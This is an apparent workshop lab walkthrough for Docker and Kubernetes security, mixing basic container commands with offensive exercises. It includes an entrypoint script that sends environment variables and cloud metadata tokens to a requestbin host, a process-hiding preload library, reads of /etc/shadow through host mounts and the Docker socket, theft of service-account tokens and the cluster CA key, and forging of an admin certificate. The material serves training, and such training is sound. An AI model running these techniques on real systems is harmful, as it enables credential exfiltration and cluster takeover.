# Labs Walk Thru
**This is an accompanying file with the lab instructions and commands to help walk thru the labs. It's especially intended for use for those that have trouble copying and pasting from the slides, or prefer not to.**

**If viewing on GitHub, you can navigate using the table of contents button in the top left next to the line count.**

## Module 1 - Docker

#### Slide 17 - Exercise - is this thing on?

```
docker --help
```

```
docker run --help
```

#### Slide 18 - Troubleshoot (Docker health check)

Is Docker reporting down or VM was stopped after setting up, try running these commands:

```
sudo apt install acl -y
```
```
sudo systemctl status docker
```
Do this if status is not reporting up:

```
sudo systemctl restart docker
```

Create this ACL so you can run docker command without typing sudo everytime.
```
sudo setfacl -m user:$USER:rw /var/run/docker.sock
```

#### Slide 19 - Babby's first image
```
docker run hello-world
```

### Slide 20 - Single Command/Interactive Containers

Running single command in a container
```
docker run alpine ip addr
```

Run an interactive session (shell) within a container (interactive termianl
```
docker run -it alpine /bin/ash
```
Type `exit` to exit the shell session in the container

>  -i, --interactive                    Keep STDIN open even if not attached
>  
>  -t, --tty                            Allocate a pseudo-TTY

### Slide 21 - Interactive Containers (cont)

List running containers?
```
docker ps
```
Where's the container, was it destroyed?
```
docker ps --all
```

Note: Replace \<id\> below with the container id from the output of the above command.
  - Tip: you usually only need the first few letters of the id for Docker to locate.

```
docker start <id>
```
```
docker ps 
```
```
docker attach <id>
```

Note: exit once done
```
exit
```

### Slide 22 - Background a container

```
docker run -d nginx
```

```
docker ps
```

```
docker stop <nginx_container_id>
```
  
Overide name commands (optional):
```
docker run --name webserver -d nginx
```
```
docker container ls
```

### Slide 23 - Container Persistence

```
docker ps -a
```

### Slide 24 - Process Hierarchy

```
docker run -d nginx
```
```
ps auxf
```

## Module 2 - Exploring Containers

### Slide 27 - Where do images come from?

```
docker search nmap
```

### Slide 29 - Exercise: Exploring Images and Container History

```
docker run --name hist -it alpine /bin/ash
```
Inside the container shell run:
```
mkdir test && touch /test/Lorem
```
```
exit
```
Back on the host run:
```
docker container diff hist
```
```
docker container commit hist history_test
```
```
docker image history history_test
```

### Slide 30 - Exercise: Exploring Container Images and History from DockerHub

```
docker search dropboxservice
```

### Slide 31 - Docker Image History

```
docker pull mkefi/dropboxservice:latest
```

```
docker image ls
```

```
docker history mkefi/dropboxservice
```

```
docker history --no-trunc --format "{{.CreatedAt}}: {{.CreatedBy}}" mkefi/dropboxservice |less
```

> Use up and down arrow keys or `[SPACE]` to navigate, type `q` to quit

### Slide 33 - Extract without running

```
docker create mkefi/dropboxservice
```

Note: Replace $container_id with Container ID returned by last command (only need first part)
```
docker cp $container_id:/dropboxservice.jar /tmp/app.jar
```
```
ls /tmp/*.jar
```
```
vim /tmp/app.jar
```
Remember `[ESC]` then `:q!` to exit from vim/view without saving

Now that we've extracted the jar, we can remove the container. Use same container id from a few commands ago for command below.
```
docker rm $container_id
```

### Slide 34 - Optional, quick checks

```
file /tmp/app.jar
```
```
mkdir /tmp/app
```
```
unzip /tmp/app.jar -d /tmp/app/
```
```
cat /tmp/app/META-INF/MANIFEST.MF
```
Note the start class
```
strings /tmp/app.jar |less 
```

### Slide 35 - Going the distance - decompile (with docker!)

```
docker run -it --rm -v /tmp/:/mnt/ --user $(id -u):$(id -g) kwart/jd-cli /mnt/app.jar -od /mnt/app-decompiled
```

```
ls /tmp/app-decompiled/
```

```
less /tmp/app-decompiled/BOOT-INF/classes/application.yml
```

### Slide 36 - Manual Reversing (just another way of extracting files from an image)

```
cd ~ && mkdir testimage && cd testimage
```
```
docker pull nginx
```
```
docker save -o nginx.tar nginx
```
```
tar -xvf nginx.tar
```

### Slide 37 - Manual Reversing cont.

```
cat <hash>/json | jq
```

### Slide 39 - Optional - Automated

```
sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 nginx:latest
```
```
sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 mkefi/dropboxservice
```

### Slide 42 - Watch out: Exposing Services

```
docker run -d -p 8080:80 nginx
```

### Slide 43 - is nginx real?

```
docker image inspect nginx | jq
```

```
docker trust inspect nginx | jq
```

## Module 3: Offensive Docker Techniques

### Slide 48 - Starting Tracee

Start a new terminal window
```
docker run --name tracee -d --rm --pid=host --cgroupns=host --privileged -v /etc/os-release:/etc/os-release-host:ro \
-e LIBBPFGO_OSRELEASE_FILE=/etc/os-release-host aquasec/tracee:latest
```

```
docker logs tracee --follow 2>$1 |grep MatchedPolicies
```

### Slide 49 - Create a Dockerfile

```
cd ~ && mkdir imagetest && cd imagetest && vi Dockerfile
```

Note: Go to requestbin.com and choose the public bin link below the large Create Request Bin button

### Slide 50 - Create a Dockerfile

Paste the below contents into the vi after hitting `i` for insert
```
FROM ubuntu:20.04
RUN groupadd -g 999 usertest && \
useradd -r -u 999 -g usertest usertest
RUN apt update && apt install -y curl tini
COPY ./docker-entrypoint.sh /docker-entrypoint.sh
RUN chmod +x docker-entrypoint.sh
USER usertest
# Go to requestbin.com and get a public url and replace REQUESTBIN_URL below
ENV URL REQUESTBIN_URL
ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
# Replace HANDLE with your l33t hacker name or some other identifying designation
ENV USER HANDLE
# add a password 
ENV PW PASSWORD
ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
```
> After pasting, hit `[ESC]`, then type `:wq`


### Slide 51 - Create an entrypoint script

```
vi docker-entrypoint.sh
```

### Slide 52 - Create an entrypoint script

Paste the below script into the vi after hitting `i` for insert 
```
#!/usr/bin/env bash

if [ "shell" = "${1}" ]; then
  /bin/bash
else
 while true
 do
	sleep 30
	curl -s  -X POST -A "${UA}" -H "X-User: ${USER}" -H "Cookie: `uname -a | gzip | base64 -w0`" -d \
`{ env && curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; } | gzip | openssl enc -e -aes-256-cbc -md sha512 -pbkdf2 -salt -a -pass "pass:${PW}" | base64 -w0` \
$URL
	echo
 done
fi
```
> After pasting, hit `ESC`, then type `:wq`

### Slide 53 - Build and run your image

```
docker build -t cmddemo .
```

```
docker run --name demo -d cmddemo
```

```
docker logs demo --follow 2>$1
```


### Slide 54 - Build and run your image (cont.)

The trick to this one is pasting the contents of the cookie field in the request you recieved on requestbin, into the base64 command below. This will decode it and pipe through gunzip to decompress the contents.
```
base64 -d <<< [cookie field content] | gunzip
```

>Take a look back at tracee terminal per slide 52

### Slide 56 - Observing Docker

```
docker ps
```
Note name or id of running container and use it in command below
```
docker stop demo
```

```
docker events
```

>Alternative to docker events command:
>```
>sudo ctr --address /var/run/containerd/containerd.sock events
>```

### Slide 58 - Working with external data / using Docker in your offensive toolkit

```
docker run --rm -it instrumentisto/nmap -A -T4 scanme.nmap.org
```

Where's the output? (optional)
```
mkdir ~/vol_test && cd ~/vol_test/
```
```
docker run -v ~/vol_test:/output instrumentisto/nmap -sT -oA /output/test scanme.nmap.org 
```
```
ls -l ~/vol_test
```
```
cat test.nmap
```

### Slide 60 - Docker with root or etc mounted as volume

```
docker run -it -v /:/host alpine /bin/ash
```
```
cat /host/etc/shadow
```
```
exit
```

### Slide 61 - Docker running privileged containers

```
docker run -it --privileged ubuntu /bin/bash
```
```
apt update && apt-get install -y libcap2-bin
```
```
capsh --print
```
```
grep Cap /proc/self/status
```
```
capsh --decode=0000003fffffffff
```
```
exit
```

### Slide 62 - Exercise: Exposed Docker socket hijinx

```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/dash
```

```
cd var/run/ && ls -l
```

```
apt update && apt install -y curl socat
```

```
echo '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}' > container.json
```

```
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
```
Make note of the first 4-5 characters of the ID returned, you'll need it in the next command.
```
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<id 4-5 first chars>/start
```

### Slide 63 - Exposed docker socket hijinx (cont.)

```
socat - UNIX-CONNECT:/var/run/docker.sock
```
Make sure you do this carefully and be sure to put the container id in the POST url
```
POST /containers/<id-first-5-chars>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp


```
After hitting enter twice, the socket should return an http status indicating the connection was upgraded.
```
ls
```
```
cat /host_etc/shadow
```

### Slide 64 - Docker persistence

```
docker run -d --restart always nginx
```


## Module 4 - Container IR - GL,HF.

### Slide 68 - Image CTF
```
docker image pull digitalshokunin/webserver
```

### Slide 75 - Clean ups

```
docker system df
```

```
docker system prune
```

```
docker container prune
```

## Module 5 - Kubernetes 101

> No commands for this section

## Module 6 - The Basics of using K8S

### Slide 96 - Try out kubectl

```
kubectl get nodes
```

### Slide 97 - Namespaces

```
kubectl get namespaces
```

### Slide 98 - Creating a namespace

```
kubectl create namespace lab-namespace
```

```
kubectl get namespaces
```

### Slide 101 - Accessing a cluster

```
kubectl cluster-info
```

### Slide 103 - Display pods

```
kubectl get pods
```

Specify namespace
```
kubectl get pods -n kube-system
```

All namespaces
```
kubectl get pods --all-namespaces
```

Describe (get more details) on a pod
```
kubectl -n kube-system describe pod <name>
```

### Slide 105 - Babby's first pod

```
wget https://k8s.io/examples/pods/simple-pod.yaml
```

```
kubectl apply -f simple-pod.yaml --namespace lab-namespace
```

```
kubectl get pods
```

```
kubectl get pods --namespace lab-namespace
```

```
kubectl describe pod nginx --namespace lab-namespace
```

```
kubectl get pod nginx --namespace lab-namespace
```

```
kubectl get pod nginx -o wide --namespace lab-namespace
```

## Module 7 - Kubernetes Security

### Slide 120 - Lab Setup

```
ansible-playbook k8s-ansible-setup.yaml
```


### Slide 123 - Lab Scenario

By now your Ansible playbook should have finished with no errors, if so great, if not, get our TA's attention.

We need the to pretend we've compromised dev creds to Kubernetes, we'll do this by switching kubectl's context (contexts are often used when kubectl users have multiple clusters or accounts)
```
kubectl config use-context developer@kind-lab
```

### Slide 124 - Priv esc - to golden tickets (lab)

What can it do?
```
kubectl auth can-i --list
```

Permissions on dev account seem to be very limited
```
kubectl get pods
```
There's one pod we seem to have access to...

Let's exec into it. Change the `[rand]` below to match the random string in the pod name from the last command
```
kubectl exec -it myapp-[rand] -- /bin/bash
```

### Slide 125 - Priv esc - to golden tickets (lab cont.)

Install some tools we'll need

**Note:** we can do this because we're running in the container as root, otherwise we'd just pull in these tools some other way

```
apt update && apt install -y curl
```

```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

chmod `kubectl`  and move it to /usr/local/bin 

```
chmod +x kubectl && mv kubectl /usr/local/bin
```

Use kubectl to see what we can do from this pod?

```
kubectl auth can-i --list
```
### Slide 126 - Priv esc - Why does this work?

Look at the pod's service account K8S mounts inside the container

```
ls -l /var/run/secrets/kubernetes.io/serviceaccount/
```

### Slide 127 - Priv esc - to golden tickets (lab cont.)

Get secrets

```
kubectl get secrets
```

Not much there, lets see if we can see secrets outside our namespace?

```
kubectl get secrets --all-namespaces
```

One of these looks interesting...

```
kubectl get secrets -n tracee-system | grep security
```

Let's try and get the service account token stored in this secret
```
kubectl -n tracee-system get secret security-svc-token -o json
```

For this command we used `-o json`, hence the output details in json, some cases makes it easier to parse

### Slide 129 - Priv esc - to golden tickets (lab cont.)

We need to get the token in a form we can use

```
export TOKEN=$(kubectl -n tracee-system get secret security-svc-token -o=jsonpath="{.data.token}" | base64 -d)
```
**Note:** The above command parses the field out of josn, and decodes the base64

```
echo $TOKEN
```
**Note:** Starts with eyJ which is the clue its a JSON Web Token, which is in base64 still (it was encoded twice), the eyJ is the first few characters in a JSON doc in base64. You can always `echo $TOKEN | base64 -d` if you want to see what the JSON looks like in a JWT

```
kubectl auth can-i --list
```

### Slide 130 - Priv esc to golden tickets (lab cont.)

Let's try to use the token this time
```
kubectl auth can-i --list --token="$TOKEN"
```

This time `kubectl` used our stolen token, so now we're authenticating as the other service account with all the privileges. We'll have to make sure to include the TOKEN in future commands to keep using this account.

The big thing you'll should notice in the command output is a * on resources on the same line as a * on verbs. 
Since you can do every verb on every resource, this is kind of like root/domain admin for Kubernetes.

Let's find the API service pod, it'll be running in the kube-system namespace.

```
kubectl get pods -n kube-system --token="$TOKEN"
```

We're looking for the pod with "kube-apiserver-" in the name.

Great let's steal the PKI private key off the api server pod and take over the cluster
```
kubectl --token="$TOKEN" -n kube-system exec kube-apiserver-lab-control-plane -- cat /etc/kubernetes/pki/ca.key
```

### Slide 132 - Priv esc to golden tickets (lab cont.)

That last command doesn't work anymore, lets try something else...

Let's 'debug' the control plane using a debug pod

```
kubectl debug node/lab-control-plane -it --image=ubuntu --token=$TOKEN
```

You now have a session in this special debug pod, it nicely mounts the host filesystem for us so you can "debug" it
```
cd /host
```

Now we can go after that CA private key for the PKI
```
cat etc/kubernetes/pki/ca.key
```

Copy and paste this to notepad or something for later

Might as well grab the PKI CA cert too even though its already public its convenient.
```
cat etc/kubernetes/pki/ca.crt
```

Copy and paste this too


### Slide 134 - CA keys - golden tickets (kill shot)

Do this twice to back out of both shell instances (debug pod and pod you exec'ed to as developer account)
```
exit
```

Create a directory we can work with the certs in
```
mkdir ~/certs && cd ~/certs
```

Paste this line
```
cat << -EOF- > ca.key
```
Paste the contents of the the CA private key (ca.key) we grabbed earlier (the one starting with `-----BEGIN RSA PRIVATE KEY-----`)

Paste the -EOF- string to signal to cat we're done
```
-EOF-
```

Normally cat reads files, but this is an easy way to paste contents into a file, in this case it is written to `ca.key` which is the same name as it had where we found it.

**Note:** The -EOF- is a special string we specify to cat that we're done inputting. It can be any string, but normally, the convention is to use `EOF`, we only added dashes to either side on the off change the characters `EOF` together is a random part of the key. 

Do the same thing again with the CA public certificate, but to `ca.crt` file.

```
cat << -EOF- > ca.crt
```

Paste the contents of ca.crt (the one starting with -----BEGIN CERTIFICATE-----)

Paste or type (carefully) the -EOF- string.
```
-EOF-
```

Check both files were written to successfully
```
cat ca.key ca.crt
```

You should see the output display the private key first with both lines saying BEGIN/END RSA PRIVATE KEY respectively, followed by the certificate starting ending with the BEGIN/END CERTIFICATE lines respectively and all 5 dashes on each end, etc.

Abridged Example:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAvolMNLYvhQHr0xq+bJg/dpwzqF4QkW+4fF0+o5W0I/3sO/6Q
XZTw6dQgdNbr7kXUqICsM+sKupU5swWBVzVgz6CXroxBVgthfQwzUWkxJv5GWSJj
C2vlv/7uaxlUbTSCTVzBpzbbucz0kMyBth+lo8FT/1Mv/9hEjPWOhBHpHT2OPnc3
qeBCE+qM3Ams0WyuYInUHZ9J2F9uh26mjjkU6fGboEcY0wYjmVO6gzslQazuyDdQ
hWXNg7tEhiz/1iNuNS09vS6nuvXqkKZZvOWgr4KB93vJt4mvvn+Zfcbm+SR6OzYq
aRjDGK32iyLrzHpYWU+z52gjczSj/1RpWU7K7EP64HtpaXqG5jktsNNw+B6lmWt5
a88i2x+U+JMsaKhBKWakYFhDMTWBzD/GSYat06Ko+Mx2ySyPhZr77fvqJ5dyBa5c
+u9ikA8fk2IDOZgA74ocORHr1r4deIsz8G3cU6x9Z/7AT+ay6fhVt0E=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIBpzCCAU2gAwIBAgIBADAKBggqhkjOPQQDAjA7MRwwGgYDVQQKExNkeW5hbWlj
bGlzdGVuZXItb3JnMRswGQYDVQQDExJkeW5hbWljbGlzdGVuZXItY2EwHhcNMjIw
NDIwMjAzNzQ5WhcNMzIwNDE3MjAzNzQ5WjA7MRwwGgYDVQQKExNkeW5hbWljbGlz
dGVuZXItb3JnMRswGQYDVQQDExJkeW5hbWljbGlzdGVuZXItY2EwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAASOdvgi0R6lXNcCZAQcF1GNSEaEookyiMe8/hI8vmQD
MzBQMgSvo4e0L1HAuOoiI3U4lY89d+o5ms5inXxZgAKko0IwQDAOBgNVHQ8BAf8E
HVSrrIEwCgYIKoZIzj0EAwIDSAAwRQIhAPZDT7THv4l3+icQ4o9Wb4m6+2x5KCae
aqxwiPwccDGGAiA1PMao7JoSfYr27NL3QKbGo3NLtv0G5fZpLccJ/cq3qw==
-----END CERTIFICATE-----
```

### Slide 135 - CA keys - golden tickets (kill shot)


Now we need to generate a private key for our "user" we're going to impersonate
```
openssl genrsa -out user.key 2048
```

Create a CSR (Certificate Signing Request) and in the subject field, we specify the username as a CN (Common Name) and the group as a O (Organization).
```
openssl req -new -key user.key -subj "/CN=kubernetes-admin/O=system:masters" -out user.csr
```

Normally you'd send the CSR to your Certificate Authority to sign it with their private key, and whose signature can be verified with their public cert, but we have the private CA key, so now we are the CA so we'll sign our own request.
Since, we have the private key and a copy of the public cert, we can now sign this CSR as the Kubernetes CA.
```
openssl x509 -req -in user.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out user.crt -days 1024 -sha256
```

The signed cert is output to user.crt

We can now import the cert into our .kube/config file for use by `kubectl`
```
kubectl config set-credentials kubernetes-admin --client-certificate=user.crt --client-key=user.key --embed-certs
```
Now we'll create a context that'll use the credentials and uses the existing cluster settings
```
kubectl config set-context k8s-admin@hacked-cluster --user=kubernetes-admin --cluster kind-lab
```

Finally, we'll switch `kubectl` to use the new context.

```
kubectl config use-context k8s-admin@hacked-cluster
```

You can test out your access, you're still admin, but now its as the cluster admin account you were using before switching to the developer accoount, just with a second certificate.
```
kubectl auth can-i --list
```

You can just keep using this new signed client certificate since its for the same user.

### Slide 139 - Evil Pod (lab)

Let's go back to the original scenario but this time the pod and special service account didn't exist.
```
kubectl delete deployment myapp -n pls-dont-hack-me
```

```
kubectl delete serviceaccount read-secrets -n pls-dont-hack-me
```

**Note:** Notice you did that as kubernetes-admin account but with the context using your forged certificate

Now lets go back to pretending we've compromised the developer's credentials and switch to using them.

```
kubectl config use-context developer@kind-lab
```
Let's go back to the home directory
```
cd ~
```

You now no longer have a priv esc to exploit, but there's often another trick.

Let's take a look at a special pod manifest 
```
cat k8s-manifests/evilpod.yaml
```

Note the nodeName and volume mounts.

### Slide 141 - Evil Pod (Lab Cont.)

Let's create this pod and deploy it on the controlplane node. 
```
kubectl apply -f k8s-manifests/evilpod.yaml
```
**Note:** You cloud also run `create` instead of `apply` but apply will create if it doesn't exist and modify the pod specifications to match the manifest and restart it, if it does.

Now that the pod's running, we can run a simple command to steal the key from the host volume mounted inside of it.
```
kubectl exec -it -n pls-dont-hack-me evil-pod -- cat /controlplane/etc/kubernetes/pki/ca.key
```

Much more straight forward way of getting to the control plane as developer, that often works in Kubernetes nodes without Admissions Controller checks.

### Slide 145 - Cleanup

Switch back to original account/context
```
kubectl config use-context kind-lab
```

Verify your admin rights are back (look for * on resources and verbs)
```
kubectl auth can-i --list
```

This is optional, but run apply these manifests if you want to put back the service account and pod used in the priv esc lab if you want to do it again later.

```
kubectl apply -f k8s-manifests/serviceaccounts.yaml
```

```
kubectl apply -f k8s-manifests/pods.yaml
```

You can run this to delete the evilpod since you're done with it.
```
kubectl delete -f k8s-manifests/evilpod.yaml
```

### Slide 151 - Ex: Cloud Metadata attacks

Execute a pod in our lab with heavily restricted permissions.

```
kubectl apply -f https://raw.githubusercontent.com/lockfale/Malicious_Containers_Workshop/main/DC31/k8s-manifests/nothingallowedpod.yaml --namespace lab-namespace
```

Start a shell in our restricted pod
  
```
kubectl exec -it nothing-allowed-exec-pod -n lab-namespace -- bash
```

```
curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/'
```

```
curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/id' -w "\n"
```

```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

### Slide 155 - Play with Prometheus/Grafana

```
export WORKER1=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' lab-worker)
```

Create a tunnel for Grafana:
```
ngrok http $WORKER1:31000 --oauth=google --oauth-allow-email=<your.email>@gmail.com
```

Open the ngrok provided URL

Click through the warning message, login with your Google Account matching the email you provided in the ngrok command

You now have access to your Grafana Dashboard from the internet

Grafana Credentials

Username:
```
admin
```
Password:
```
prom-operator
```

Commands for other services (if you want to explore later outside of workshop):

Prometheus Tunnel:
```
ngrok http $WORKER1:30000 --oauth=google --oauth-allow-email=<your.email>@gmail.com
```

AlertManager:
```
ngrok http $WORKER1:32000 --oauth=google --oauth-allow-email=<your.email>@gmail.com
```


### Slide 157 - Tracee events in Grafana

Navigate:
Top right Hamburger menu &rarr; Explore

![image](https://github.com/lockfale/Malicious_Containers_Workshop/assets/913856/3750b447-358a-4973-92cb-a487ac1a02c6)

Switch Prometheus in the top left to Loki

![image](https://github.com/lockfale/Malicious_Containers_Workshop/assets/913856/6cdc9dd9-7d8a-47d2-a79c-0450902646d3)

On the left side you'll see an option for Builder or Code, select Code.

![image](https://github.com/lockfale/Malicious_Containers_Workshop/assets/913856/4f3eb611-c5c7-4c39-b60e-fc00d05a8848)

Paste this query into the query bar and click Run Query
```
{namespace="tracee-system"} |= `matchedPolicies` != `sshd` | json | line_format "{{.log}}"
```
Narrow down results to your own activity.
```
{namespace="tracee-system"} |= `matchedPolicies` != `sshd` | json | line_format "{{.log}}" | hostName !~ `juice-shop-.*`
```


**Adding the Dashboard**

Under top-left menu hamburger menu &rarr; Dashboards

Select New &rarr; Import

In another tab, open the link below and copy the json from there

```
https://raw.githubusercontent.com/lockfale/Malicious_Containers_Workshop/dc31/DC31/grafana/tracee-dashboard.json
```

Paste the json in the text box labeled 'Import via panel json'

Click the `[Load]` button

## Appendix


### Slide 161 - Exercise: Libprocess hider lab

#### This lab was part of our original workshop, but eBPF and other changes like observability sitting outside namespace have made it irrelevant. That said, it's still a fun exercise and shows off some cool LoL techniques for data exfil.

Let's go back to our cmddemo Dockerfile
```
cd ~/imagetest
```
```
git clone https://github.com/gianlucaborello/libprocesshider
```
```
cd libprocesshider && vi processhider.c
```

Change this:
```
/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "evil_script.py";
```
to this (use `i` to enter insert mode in vi):
```
static const char* process_to_filter = "sleep";
```
> After changing, hit `[ESC]`, then type `:wq`

Compile:
```
make
```

### Slide 162 - Libprocess hider lab (cont.)

```
cd ..
```
We're going to update the Dockerfile from our cmddemo to do more things
```
vi Dockerfile
```
We're going to add 4 new lines

>Reminder about vi: `i` for insert mode to edit text, use arrow keys to navigate, `[ESC]` to exit insert mode, `:wq` to save(write to file) and quit

Between these two lines
```
RUN apt update && apt upgrade -y && apt install -y curl tini
COPY ./docker-entrypoint.sh /docker-entrypoint.sh
```
Add:
```
COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
```
This copies in the library we just compiled and adds an entry to the ld.so.preload file to load it during "preload"

Between these two lines
```
ENV USER HANDLE
ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
```
add and replace PASSWORD with one you made up:
```
# Replace password with a unique one of your own
ENV PW PASSWORD
```

When is all done, your Dockerfile should look like this.

```
FROM ubuntu:20.04
RUN groupadd -g 999 usertest && \
useradd -r -u 999 -g usertest usertest
RUN apt update && apt upgrade -y && apt install -y curl tini
COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
COPY ./docker-entrypoint.sh /docker-entrypoint.sh
RUN chmod +x /docker-entrypoint.sh
USER usertest
# Go to requestbin.net and get a public url and replace below
ENV URL REQUESTBIN_URL
ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
# Replace HANDLE with your l33t hacker name or some other identifying designation
ENV USER HANDLE
# Replace password with a unique one of your own
ENV PW PASSWORD
ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
```
> After pasting, hit `[ESC]`, then type `:wq`

### Slide 163 - Libprocess hider lab (cont.)

>`[ESC]` then type `:wq` if you haven't already from last slide

We're also going to edit the docker-entrypoint.sh file, it's easier to just replace the whole thing.
```
vi docker-entrypoint.sh
```

>vi Tip: just hit `dd` repeatedly to delete whole lines, then go into insert mode and paste the contents below
```
#!/usr/bin/env bash

if [ "shell" = "${1}" ]; then
  /bin/bash
else
 while true
 do
    sleep 30
    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" -d \
`{ env && curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; } | gzip | openssl enc -e -aes-256-cbc -md sha512 -pbkdf2 -salt -a -pass "pass:${PW}" | base64 -w0` \
$URL
    echo
 done
fi
```

This adds a little more data to our exfil, we'll go over this.

> After pasting, hit `[ESC]`, then type `:wq`

### Slide 164 - Libprocess hider lab (cont.)

>`[ESC]` then type `:wq` if you haven't already from last slide

Rebuild the container
```
docker build -t cmddemo .
```

Run the container in the background(detached) and just give us the container id (`-d` aka `--detach`)
```
docker run -d cmddemo
```

After 30 seconds, you should see a new request on your requestbin tab (that hopefully you kept open). If not create a new public requestbin, re-edit your Dockerfile, replace the environment variable value with the new one, rebuild, and re-run the container.

### Slide 165 - Libprocess hider lab (cont.)

Decrypt and decode the new data in the raw output of the requestbin request that came in. Replace `[DATA]` with the base64 string from it in the command below. Don't forget to replace `[strong password]` in the command below with the one you set in the Dockerfile.

Enter these commands below as three separate lines, do not hit `[ENTER]` until you've replaced the `[DATA]` and the password.
** use the clipboard function for these comands with newline `\` otherwise it'll hit return before you're ready. **

```
base64 -d <<< [DATA] \
```
```
| openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -a -salt -pass "pass:[strong password]" \
```
```
| gunzip
```

What do you see? Why would this information be useful to an attacker?

Let's test out the libprocesshider

```
docker ps
```
Use id/name in to replace `[container name/id]` in command below
```
docker exec [container name/id] ps auxf
```
Where's the sleep process?

Run the process list outside the container/namespace.
```
ps auxf |grep systemd
```
There it is, why isn't it hiding the process outside the namespace?

Stop the container (running in background) now that we're done with it. 
```
docker stop [container name/id]
```


### Slide 178 - Complex Microservices app demo

You can run this in your lab cluster.

```
kubectl create -f https://raw.githubusercontent.com/microservices-demo/microservices-demo/master/deploy/kubernetes/complete-demo.yaml
```

```
kubectl get deployments -n sock-shop
```

```
kubectl get replicasets -n sock-shop
```

### Slide XXX - Accessing services running in containers

Start up web service, but don't expose externally (e.g. `-p 80:80`), only expose locally on bridge interface

```
docker run --name=netwebserver -d nginx
```

Get the IP of the bridge interface

```
docker inspect -f "{{ .NetworkSettings.IPAddress }}" netwebserver 
```

Access service from host machine thru bridge interface

```
curl http://[IP]
```

Clean up 

```
docker stop netwebserver
```

### Slide XXX - Create side-car pod, test nginx, and remove pod (run in conjunction with babby's first pod

```
kubectl run -it shell-container --image=alpine/curl:8.1.2 /bin/ash --namespace lab-namespace
```

Get IP from pod description

```
curl http:\\[IP]
```

```
exit
```

```
kubectl delete pod shell-container --namespace lab-namespace
```


### Slide XXX - Using curl to interact with Kubernetes API Server

Kubernetes mounts the token info for service accounts inside container to make them available for use

```
kubectl run -it shell-container --image=alpine/curl:8.1.2 /bin/ash --namespace lab-namespace
```

From inside a container in a pod with attached service account

```
cd /run/secrets/kubernetes.io/serviceaccount && ls -l
```

Set the namespace as well
```
NAMESPACE=lab-namespace
```

Optionally: Assign the token to variable for later
```
TOKEN=$(cat token)
```


or use some other tool to do the curl request below:

```
curl --cacert ca.crt \
-H "Authorization: Bearer $(cat token)" \
https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
```

ca.crt, etc are all provided in the /run/secrets/kubernetes.io/serviceaccount directory. We read token straight from the file and inserted it in the curl command above. Likewise, Kubernetes internal DNS resolves kubernetes.default.svc to the API server IP for you.

You'll get a JSON response back that you can parse yourself.

Likely it was a forbidden response.

But it did tell you what rights you need. We could create a whole new service account and assign that to the pod (proper way) but to save time, can just give rights 
to the current account. Open a new terminal to the server.

```
kubectl create role pod-reader --verb=get --verb=list --verb=watch --resource=pods --namespace lab-namespace
```

```
kubectl create rolebinding lab-namespace-default-pod-reader --role pod-reader --serviceaccount=lab-namespace:default --namespace lab-namespace
```

Exit/close this window.  Back in the other window:

```
kubectl attach shell-container -c shell-container -i -t -n lab-namespace
```

```
cd /run/secrets/kubernetes.io/serviceaccount && NAMESPACE=lab-namespace
```

```
curl --cacert ca.crt \
-H "Authorization: Bearer $(cat token)" \
https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
```

Now you should see a full response, at least including the pod you're running in.

You can exit the pod and if you want to clean up delete the shell-container pod.

```
kubectl delete pod shell-container -n lab-namespace
```
